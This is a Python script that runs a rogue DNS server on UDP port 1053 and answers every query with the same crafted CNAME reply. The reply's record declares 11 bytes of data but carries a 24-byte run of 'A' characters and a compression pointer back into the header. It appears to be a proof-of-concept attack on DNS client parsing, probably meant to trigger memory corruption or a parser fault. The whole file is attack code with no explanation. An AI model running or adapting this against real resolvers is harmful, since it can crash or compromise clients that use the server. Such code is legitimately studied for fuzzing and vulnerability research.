from binascii import hexlify, unhexlify
from socket import AF_INET, SOCK_DGRAM, socket
from struct import unpack

sock = socket(AF_INET, SOCK_DGRAM)
sock.bind(('0.0.0.0', 1053))

while True:
    request, addr = sock.recvfrom(4096)
    print(b'<<< '+hexlify(request))
    ident = request[0:2]
    # find request
    nullptr = request.find(0x0,12)
    reqname = request[12:request.find(0x0,12)+1]
    reqtype = request[nullptr+1:nullptr+3]
    reqclass = request[nullptr+3:nullptr+5]
    print('name: %s, type: %s, class: %s' % (reqname, unpack('>H', reqtype), unpack('>H', reqclass)))
    # CNAME response
    response = request[0:2] + \
               unhexlify('''81800001000100000000''') + \
               reqname + reqtype + reqclass + \
               unhexlify('c00c0005000100000e10000b18414141414141414141414141414141414141414141414141c004')
    print(b'>>> '+hexlify(response))
    sock.sendto(bytes(response), addr)